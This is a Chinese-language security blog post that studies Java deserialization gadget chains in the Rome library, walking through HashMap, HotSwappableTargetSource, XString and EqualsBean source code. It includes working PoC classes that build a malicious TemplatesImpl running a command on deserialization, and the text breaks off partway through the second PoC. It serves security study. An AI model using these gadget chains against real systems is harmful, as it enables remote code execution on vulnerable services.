<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="RomeRome触发所有getter123456789101112131415161718192021222324252627282930313233343536public String toString() &#123;    Stack stack &#x3D; (Stack)PREFIX_TL.get();    String[] tsInfo &#x3D; (String[])(stack.isEmpty(">
<meta property="og:type" content="article">
<meta property="og:title" content="Rome">
<meta property="og:url" content="http://example.com/2025/01/09/Rome/index.html">
<meta property="og:site_name" content="毛利小五郎">
<meta property="og:description" content="RomeRome触发所有getter123456789101112131415161718192021222324252627282930313233343536public String toString() &#123;    Stack stack &#x3D; (Stack)PREFIX_TL.get();    String[] tsInfo &#x3D; (String[])(stack.isEmpty(">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2025-01-09T04:54:00.000Z">
<meta property="article:modified_time" content="2025-01-09T04:55:03.145Z">
<meta property="article:author" content="Mouri-Kogorou">
<meta name="twitter:card" content="summary">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>Rome</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/Mouri-Kogorou">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/01/09/Rome/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/01/09/Rome/&text=Rome"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/01/09/Rome/&title=Rome"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/01/09/Rome/&is_video=false&description=Rome"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Rome&body=Check out this article: http://example.com/2025/01/09/Rome/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/01/09/Rome/&title=Rome"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/01/09/Rome/&title=Rome"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/01/09/Rome/&title=Rome"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/01/09/Rome/&title=Rome"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/01/09/Rome/&name=Rome&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/01/09/Rome/&t=Rome"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Rome"><span class="toc-number">1.</span> <span class="toc-text">Rome</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Rome%E8%A7%A6%E5%8F%91%E6%89%80%E6%9C%89getter"><span class="toc-number">1.1.</span> <span class="toc-text">Rome触发所有getter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HashMap%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.2.</span> <span class="toc-text">HashMap反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#putVal"><span class="toc-number">1.2.1.</span> <span class="toc-text">putVal</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hash"><span class="toc-number">1.2.2.</span> <span class="toc-text">hash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HotSwappableTargetSource"><span class="toc-number">1.2.3.</span> <span class="toc-text">HotSwappableTargetSource</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EqualsBean"><span class="toc-number">1.2.4.</span> <span class="toc-text">EqualsBean</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BadAttributeValueExpException"><span class="toc-number">1.2.5.</span> <span class="toc-text">BadAttributeValueExpException</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HashMap%E5%92%8CObjetBean%E7%BB%84%E5%90%88"><span class="toc-number">1.2.6.</span> <span class="toc-text">HashMap和ObjetBean组合</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HashTable%E5%92%8CObjetBean%E7%BB%84%E5%90%88"><span class="toc-number">1.2.7.</span> <span class="toc-text">HashTable和ObjetBean组合</span></a></li></ol></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        Rome
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Mouri-Kogorou</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-01-09T04:54:00.000Z" class="dt-published" itemprop="datePublished">2025-01-09</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1 id="Rome"><a href="#Rome" class="headerlink" title="Rome"></a>Rome</h1><h2 id="Rome触发所有getter"><a href="#Rome触发所有getter" class="headerlink" title="Rome触发所有getter"></a>Rome触发所有getter</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">public String toString() &#123;</span><br><span class="line">    Stack stack = (Stack)PREFIX_TL.get();</span><br><span class="line">    String[] tsInfo = (String[])(stack.isEmpty() ? null : stack.peek());</span><br><span class="line">    String prefix;</span><br><span class="line">    if (tsInfo == null) &#123;</span><br><span class="line">        String className = this._obj.getClass().getName();</span><br><span class="line">        prefix = className.substring(className.lastIndexOf(&quot;.&quot;) + 1);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        prefix = tsInfo[0];</span><br><span class="line">        tsInfo[1] = prefix;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return this.toString(prefix);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private String toString(String prefix) &#123;</span><br><span class="line">    StringBuffer sb = new StringBuffer(128);</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(this._beanClass);</span><br><span class="line">        if (pds != null) &#123;</span><br><span class="line">            for(int i = 0; i &lt; pds.length; ++i) &#123;</span><br><span class="line">                String pName = pds[i].getName();</span><br><span class="line">                Method pReadMethod = pds[i].getReadMethod();</span><br><span class="line">                if (pReadMethod != null &amp;&amp; pReadMethod.getDeclaringClass() != Object.class &amp;&amp; pReadMethod.getParameterTypes().length == 0) &#123;</span><br><span class="line">                    Object value = pReadMethod.invoke(this._obj, NO_PARAMS);</span><br><span class="line">                    this.printProperty(sb, prefix + &quot;.&quot; + pName, value);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (Exception var8) &#123;</span><br><span class="line">        sb.append(&quot;\n\nEXCEPTION: Could not complete &quot; + this._obj.getClass() + &quot;.toString(): &quot; + var8.getMessage() + &quot;\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return sb.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>他会在toString里面触发getter方法</p>
<p>我们只需要<code>ToStringBean toStringBean = new ToStringBean(Templates.class, templateImpl);</code>这样写，然后触发他的toString()，就可以了</p>
<h2 id="HashMap反序列化"><a href="#HashMap反序列化" class="headerlink" title="HashMap反序列化"></a>HashMap反序列化</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">private void readObject(ObjectInputStream s)</span><br><span class="line">    throws IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">    ObjectInputStream.GetField fields = s.readFields();</span><br><span class="line"></span><br><span class="line">    // Read loadFactor (ignore threshold)</span><br><span class="line">    float lf = fields.get(&quot;loadFactor&quot;, 0.75f);</span><br><span class="line">    if (lf &lt;= 0 || Float.isNaN(lf))</span><br><span class="line">        throw new InvalidObjectException(&quot;Illegal load factor: &quot; + lf);</span><br><span class="line"></span><br><span class="line">    lf = Math.min(Math.max(0.25f, lf), 4.0f);</span><br><span class="line">    HashMap.UnsafeHolder.putLoadFactor(this, lf);</span><br><span class="line"></span><br><span class="line">    reinitialize();</span><br><span class="line"></span><br><span class="line">    s.readInt();                // Read and ignore number of buckets</span><br><span class="line">    int mappings = s.readInt(); // Read number of mappings (size)</span><br><span class="line">    if (mappings &lt; 0) &#123;</span><br><span class="line">        throw new InvalidObjectException(&quot;Illegal mappings count: &quot; + mappings);</span><br><span class="line">    &#125; else if (mappings == 0) &#123;</span><br><span class="line">        // use defaults</span><br><span class="line">    &#125; else if (mappings &gt; 0) &#123;</span><br><span class="line">        float fc = (float)mappings / lf + 1.0f;</span><br><span class="line">        int cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                   DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                   (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                   MAXIMUM_CAPACITY :</span><br><span class="line">                   tableSizeFor((int)fc));</span><br><span class="line">        float ft = (float)cap * lf;</span><br><span class="line">        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                     (int)ft : Integer.MAX_VALUE);</span><br><span class="line"></span><br><span class="line">        // Check Map.Entry[].class since it&#x27;s the nearest public type to</span><br><span class="line">        // what we&#x27;re actually creating.</span><br><span class="line">        SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap);</span><br><span class="line">        @SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span><br><span class="line">        Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])new Node[cap];</span><br><span class="line">        table = tab;</span><br><span class="line"></span><br><span class="line">        // Read the keys and values, and put the mappings in the HashMap</span><br><span class="line">        for (int i = 0; i &lt; mappings; i++) &#123;</span><br><span class="line">            @SuppressWarnings(&quot;unchecked&quot;)</span><br><span class="line">                K key = (K) s.readObject();</span><br><span class="line">            @SuppressWarnings(&quot;unchecked&quot;)</span><br><span class="line">                V value = (V) s.readObject();</span><br><span class="line">            putVal(hash(key), key, value, false, false);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>putVal(hash(key), key, value, false, false);</code>putval和hash都可以是漏洞的触发点</p>
<h3 id="putVal"><a href="#putVal" class="headerlink" title="putVal"></a>putVal</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">final V putVal(int hash, K key, V value, boolean onlyIfAbsent,</span><br><span class="line">               boolean evict) &#123;</span><br><span class="line">    Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; int n, i;</span><br><span class="line">    if ((tab = table) == null || (n = tab.length) == 0)</span><br><span class="line">        n = (tab = resize()).length;</span><br><span class="line">    if ((p = tab[i = (n - 1) &amp; hash]) == null)</span><br><span class="line">        tab[i] = newNode(hash, key, value, null);</span><br><span class="line">    else &#123;</span><br><span class="line">        Node&lt;K,V&gt; e; K k;</span><br><span class="line">        if (p.hash == hash &amp;&amp;</span><br><span class="line">            ((k = p.key) == key || (key != null &amp;&amp; key.equals(k))))</span><br><span class="line">            e = p;</span><br><span class="line">        else if (p instanceof TreeNode)</span><br><span class="line">            e = ((TreeNode&lt;K,V&gt;)p).putTreeVal(this, tab, hash, key, value);</span><br><span class="line">        else &#123;</span><br><span class="line">            for (int binCount = 0; ; ++binCount) &#123;</span><br><span class="line">                if ((e = p.next) == null) &#123;</span><br><span class="line">                    p.next = newNode(hash, key, value, null);</span><br><span class="line">                    if (binCount &gt;= TREEIFY_THRESHOLD - 1) // -1 for 1st</span><br><span class="line">                        treeifyBin(tab, hash);</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">                if (e.hash == hash &amp;&amp;</span><br><span class="line">                    ((k = e.key) == key || (key != null &amp;&amp; key.equals(k))))</span><br><span class="line">                    break;</span><br><span class="line">                p = e;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (e != null) &#123; // existing mapping for key</span><br><span class="line">            V oldValue = e.value;</span><br><span class="line">            if (!onlyIfAbsent || oldValue == null)</span><br><span class="line">                e.value = value;</span><br><span class="line">            afterNodeAccess(e);</span><br><span class="line">            return oldValue;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ++modCount;</span><br><span class="line">    if (++size &gt; threshold)</span><br><span class="line">        resize();</span><br><span class="line">    afterNodeInsertion(evict);</span><br><span class="line">    return null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>他可以触发equals，但是他得是两个相同类型的键key，这样才可以对比触发，比如xstring有equals</p>
<p>，HotSwappableTargetSource，AbstractMap</p>
<h3 id="hash"><a href="#hash" class="headerlink" title="hash"></a>hash</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">static final int hash(Object key) &#123;</span><br><span class="line">    int h;</span><br><span class="line">    return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里可以触发hashCode()</p>
<p>多加一个</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TreeMap.put()-&gt;任意compareTo(Object)调用</span><br></pre></td></tr></table></figure>

<h3 id="HotSwappableTargetSource"><a href="#HotSwappableTargetSource" class="headerlink" title="HotSwappableTargetSource"></a>HotSwappableTargetSource</h3><p>利用链</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl.getOutputProperties()</span><br><span class="line">ToStringBean.toString(String)</span><br><span class="line">ToStringBean.toString</span><br><span class="line">XString.equals()</span><br><span class="line">HotSwappableTargetSource.equals()</span><br><span class="line">HashMap.putVal()</span><br><span class="line">HashMap.readObject()</span><br></pre></td></tr></table></figure>

<p>这里用的是putVal()，利用里面的equals</p>
<p>然后到这里</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public boolean equals(Object other) &#123;</span><br><span class="line">    return this == other || other instanceof HotSwappableTargetSource &amp;&amp; this.target.equals(((HotSwappableTargetSource)other).target);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>target是构造函数里面赋值的，所以我们可以给第二个赋值为XString，other为第一个，这样就会到XString的equals</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">public boolean equals(Object obj2)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  if (null == obj2)</span><br><span class="line">    return false;</span><br><span class="line"></span><br><span class="line">    // In order to handle the &#x27;all&#x27; semantics of</span><br><span class="line">    // nodeset comparisons, we always call the</span><br><span class="line">    // nodeset function.</span><br><span class="line">  else if (obj2 instanceof XNodeSet)</span><br><span class="line">    return obj2.equals(this);</span><br><span class="line">  else if(obj2 instanceof XNumber)</span><br><span class="line">      return obj2.equals(this);</span><br><span class="line">  else</span><br><span class="line">    return str().equals(obj2.toString());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后触发我们漏洞点的toString()</p>
<p>poc</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">public class HotSwapExp &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        String AbstractTranslet=&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;;</span><br><span class="line">        String TemplatesImpl=&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;;</span><br><span class="line"></span><br><span class="line">        // 创建恶意类</span><br><span class="line">        ClassPool classPool = ClassPool.getDefault();</span><br><span class="line">        classPool.appendClassPath(AbstractTranslet);</span><br><span class="line">        CtClass ctClass = classPool.makeClass(&quot;aaaa&quot;);</span><br><span class="line">        ctClass.setSuperclass(classPool.get(AbstractTranslet));</span><br><span class="line">        ctClass.makeClassInitializer().setBody(&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;);</span><br><span class="line">        byte[] bytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        // 创建TemplatesImpl对象</span><br><span class="line">        Object templateImpl = Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]&#123;&#125;).newInstance();</span><br><span class="line">        setFiled(templateImpl, &quot;_bytecodes&quot;, new byte[][]&#123;bytes&#125;);</span><br><span class="line">        setFiled(templateImpl, &quot;_name&quot;, &quot;test&quot;);</span><br><span class="line">        setFiled(templateImpl, &quot;_tfactory&quot;, null);</span><br><span class="line"></span><br><span class="line">        // 创建HotSwappableTargetSource</span><br><span class="line">        ToStringBean toStringBean = new ToStringBean(Templates.class, templateImpl);</span><br><span class="line">        HotSwappableTargetSource targetSource1 = new HotSwappableTargetSource(toStringBean);</span><br><span class="line">        HotSwappableTargetSource targetSource2 = new HotSwappableTargetSource(new XString(&quot;aaa&quot;));</span><br><span class="line"></span><br><span class="line">        // 创建HashMap</span><br><span class="line">        HashMap hashMap = new HashMap();</span><br><span class="line">        hashMap.put(targetSource1, &quot;111&quot;);</span><br><span class="line">        hashMap.put(targetSource2, &quot;222&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        // 序列化</span><br><span class="line">        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;HotSwap.bin&quot;));</span><br><span class="line">        objectOutputStream.writeObject(hashMap);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">        // 反序列化</span><br><span class="line">        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(&quot;HotSwap.bin&quot;));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">        objectInputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void setFiled(Object o, String fieldname, Object value) throws Exception &#123;</span><br><span class="line">        Field field = o.getClass().getDeclaredField(fieldname);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(o, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="EqualsBean"><a href="#EqualsBean" class="headerlink" title="EqualsBean"></a>EqualsBean</h3><p>利用链</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl.getOutputProperties()</span><br><span class="line">EqualsBean.beanEquals()</span><br><span class="line">EqualsBean.equals()</span><br><span class="line">AbstractMap.equals()</span><br><span class="line">HashMap.putVal()</span><br><span class="line">HashMap.put()</span><br><span class="line">HashSet.readObject()</span><br></pre></td></tr></table></figure>

<p>这里会调用到hashcode的putval</p>
<p>poc</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">public class EqualsBeanExp &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        String AbstractTranslet=&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;;</span><br><span class="line">        String TemplatesImpl=&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;;</span><br><span class="line"></span><br><span class="line">        // 创建恶意类</span><br><span class="line">        ClassPool classPool = ClassPool.getDefault();</span><br><span class="line">        classPool.appendClassPath(AbstractTranslet);</span><br><span class="line">        CtClass ctClass = classPool.makeClass(&quot;cccc&quot;);</span><br><span class="line">        ctClass.setSuperclass(classPool.get(AbstractTranslet));</span><br><span class="line">        ctClass.makeClassInitializer().setBody(&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;);</span><br><span class="line">        byte[] bytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        // 创建TemplatesImpl对象</span><br><span class="line">        Object templateImpl = Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]&#123;&#125;).newInstance();</span><br><span class="line">        setFiled(templateImpl, &quot;_bytecodes&quot;, new byte[][]&#123;bytes&#125;);</span><br><span class="line">        setFiled(templateImpl, &quot;_name&quot;, &quot;test&quot;);</span><br><span class="line">        setFiled(templateImpl, &quot;_tfactory&quot;, null);</span><br><span class="line"></span><br><span class="line">        EqualsBean bean = new EqualsBean(String.class, &quot;s&quot;);</span><br><span class="line"></span><br><span class="line">        HashMap map1 = new HashMap();</span><br><span class="line">        HashMap map2 = new HashMap();</span><br><span class="line">        map1.put(&quot;yy&quot;, bean);</span><br><span class="line">        map1.put(&quot;zZ&quot;, templateImpl);</span><br><span class="line">        map2.put(&quot;zZ&quot;, bean);</span><br><span class="line">        map2.put(&quot;yy&quot;, templateImpl);</span><br><span class="line">        HashSet table = new HashSet();</span><br><span class="line">        table.add(map1);</span><br><span class="line">        table.add(map2);</span><br><span class="line"></span><br><span class="line">        setFiled(bean, &quot;_beanClass&quot;, Templates.class);</span><br><span 